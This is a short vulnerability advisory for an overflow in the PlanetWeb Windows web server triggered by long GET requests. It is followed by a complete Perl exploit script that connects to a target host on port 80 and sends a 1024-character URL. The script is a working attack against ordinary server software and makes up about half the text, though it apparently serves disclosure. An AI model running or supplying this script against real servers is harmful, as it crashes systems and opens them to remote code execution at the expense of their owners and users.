source: http://www.securityfocus.com/bid/5710/info

PlanetWeb is a commercially available web server distributed by PlanetDNS. It is available for the Microsoft Windows platform.

PlanetWeb is vulnerable to a buffer overflow condition when handling GET requests of excessive length. Upon receiving a GET request containing a 1024 byte or greater URL, an exploitable buffer overflow occurs. 

This may result in the remote execution of arbitrary code within the context of the web server process.

#!/usr/bin/perl
# PlanetWeb Software perl exploit
# by UkR-XblP / UkR security team
use IO::Socket;
unless (@ARGV == 1) { die "usage: $0 vulnurable_server
..." }
$host = shift(@ARGV);
$remote = IO::Socket::INET->new( Proto     => "tcp",
                                  PeerAddr  => $host,
                                  PeerPort  => "http(80)",
                                  );
unless ($remote) { die "cannot connect to http daemon on
$host" }
$xblp = "A" x 1024;
$exploit = "GET /".$xblp." HTTP/1.0\n\n";
$remote->autoflush(1);
print $remote $exploit;
close $remote;